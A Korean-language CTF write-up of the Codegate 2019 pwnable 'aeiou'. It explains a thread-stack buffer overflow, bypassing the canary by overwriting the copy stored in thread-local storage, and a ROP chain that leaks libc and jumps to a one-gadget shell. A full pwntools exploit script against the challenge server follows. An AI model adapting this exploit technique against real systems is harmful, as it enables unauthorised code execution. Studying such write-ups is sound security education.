---
layout: post
title: ! "[Codegate 2019] aeiou Write-up"
comments: true
excerpt_separator: <!--more-->
tags:
  - MyriaBreak
  - Codegate2019
  - Write-up
  - CTF
  - pwnable
---
### Description

> nc 110.10.147.109 17777

> [aeiou](../images/myria/aeiou-writeup/onewrite)


<!--more-->
주어진 바이너리를 실행하면 아래와 같은 메뉴를 확인할 수 있다.

```bash
Raising a Baby
-------------------------------------
[1] Play with Cards
[2] Clearing the Cards
[3] Teaching numbers
[4] Sleeping the Baby
[5] Dancing with Baby!
[6] Give the child blocks!
[7] Sleep me
--------------------------------------
>>
```


 하지만 어떤 메뉴를 선택하든 프로그램은 그 메뉴를 한번 실행하고 종료되기 때문에, 단 한 번에 공격이 이루어져야 한다.
 바이너리를 분석해보면 `pthread_create함수`로 새로운 스레드를 생성하여 `start_routine` 함수를 실행하는 부분이 있다. 이 `start_rountine`(0x4013AA)함수의 C 의사코드는 아래와 같다.

![]({{ site.baseurl }}/images/myria/aeiou-writeup/aeiou_02.PNG)

 버퍼는 0x1000만큼 할당되어있지만 입력은 0x10000만큼 입력할 수 있다. 이는 BOF가 있음을 알려준다.

 ```bash
 [*] '/home/myria/CTF/CODEGATE/aeiou/aeiou'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 ```

 하지만 카나리가 있기 때문에 BOF를 통해 바로 return address를 덮어씌울 방법이 없다.
 이를 우회하기위해 pthread_create함수가 이용된다. 스레드가 pthread_create함수에 의해 생성될 경우, 스레드의 스택에 `Thread Local Storage(TLS)`를 사용하여 변수를 저장한다. 즉, 스레드의 스택에 `stack_guard`(=카나리값)이 존재하기 때문에 이를 덮어씌우면 BOF를 사용하여 RIP를 컨트롤 할 수 있다.

 이제 `ROP기법`을 이용하여 라이브러리 주소를 유출(leak)하고 `원샷가젯 (execve("/bin/sh", rsp+0x30, environ))`을 실행하면 된다.

![]({{ site.baseurl }}/images/myria/aeiou-writeup/aeiou_03.PNG)

### Full exploit code

```python
from pwn import *

conn = remote("110.10.147.109", 17777)
#conn = process("./aeiou")


def Teaching(num, data):
	conn.recvuntil(">>")
	conn.sendline("3")
	conn.recvuntil("Let me know the number!\n")
	conn.sendline(str(num))
	conn.send(data)

pop_rdi = 0x4026f3
pop_rsi_r15 = 0x4026f1
bss_addr = 0x604110

# leak atol (libc_address)
payload  = p64(pop_rdi) # pop rdi; ret;
payload += p64(0x603FC0) # atol@GOT
payload += p64(0x400B58) # jmp puts@PLT

# read(0, 0x602030, SIZE) %% rdi=0, rsi=0x602030, rdx = big value
payload += p64(pop_rdi) # pop rdi; ret;
payload += p64(0)		 # stdin
payload += p64(pop_rsi_r15) # pop rsi; pop r15; ret;
payload += p64(bss_addr)
payload += p64(0)		# r15 <= garbage
payload += p64(0x400B88) # jmp read@PLT

# rsp -> bss
payload += p64(0x4026ed) # pop rsp; pop r13; pop r14; pop r15; ret
payload += p64(bss_addr)


Data  = "A"*(0x1010-8)
Data += p64(0xdeadbeefcafebabe) # fake canary
Data += "B"*8 	# sfp
Data += payload # rop chain
Data += "C" * (2000-len(payload)) # rop chain
Data += p64(0xdeadbeefcafebabe) # fake canary

Teaching(0x1010 + 2008 + 8, Data)


# leak
conn.recvuntil("Thank You :)\n")
libc_base = u64(conn.recv(6).ljust(8, "\x00")) - 0x36ea0
log.info("libc_base: " + hex(libc_base))

"""
0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
	[rsp+0x30] == NULL
"""

one_gadget = libc_base + 0x4526a
log.info("oneshot : " + hex(one_gadget))

payload  = p64(0) * 3 # pop r13; pop r14; pop r15; ret
payload += p64(one_gadget)
payload += '\x00' * 0x40  ## [rsp+0x30] == NULL

conn.sendline(payload)
conn.interactive()
```
